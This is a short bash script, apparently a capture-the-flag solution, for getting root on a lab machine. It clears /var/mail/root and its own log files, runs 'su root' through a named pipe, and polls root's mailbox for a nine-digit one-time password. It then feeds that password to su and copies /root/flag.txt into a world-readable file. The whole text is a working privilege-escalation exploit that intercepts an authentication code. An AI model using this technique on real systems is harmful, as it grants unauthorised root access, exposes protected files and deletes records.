#!/bin/bash
set +m
exec 2>&1
rm -f /var/mail/root /tmp/flag_out /tmp/flag_err /tmp/su.log /tmp/sin /tmp/poll.log 2>/dev/null
mkfifo /tmp/sin
exec 3<>/tmp/sin
script -q -f -c 'su root -c "id; echo FLAGSTART; cat /root/flag.txt; echo FLAGEND; cat /root/flag.txt >/tmp/flag_out 2>/tmp/flag_err; chmod 666 /tmp/flag_out /tmp/flag_err 2>/dev/null"' /tmp/su.log < /tmp/sin >/dev/null 2>&1 &
SP=$!
echo "su pid=$SP"
OTP=""
for i in $(seq 1 200); do
  if [ -e /var/mail/root ]; then
    sz=$(stat -c %s /var/mail/root 2>/dev/null)
    echo "iter=$i exists size=$sz" >> /tmp/poll.log
    OTP=$(tr -d '\r' < /var/mail/root 2>/dev/null | awk '/^[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/{print; exit}')
    [ -n "$OTP" ] && { echo "iter=$i FOUND OTP=$OTP" >> /tmp/poll.log; break; }
  else
    echo "iter=$i noexist" >> /tmp/poll.log
  fi
  sleep 0.25
done
echo "OTP=[$OTP] iter=$i"
printf '%s\n' "$OTP" >&3
for i in $(seq 1 80); do [ -s /tmp/flag_out ] && break; sleep 0.25; done
sleep 1
echo "=== FLAG_OUT ==="; cat /tmp/flag_out 2>&1
echo "=== poll.log (last 8) ==="; tail -8 /tmp/poll.log 2>&1
echo "=== varmail/root now ==="; tr -d '\r' < /var/mail/root 2>&1 | sed -n '1,30p'
echo "=== SU.LOG ==="; tr -d '\r' < /tmp/su.log 2>&1 | sed -n '1,30p'
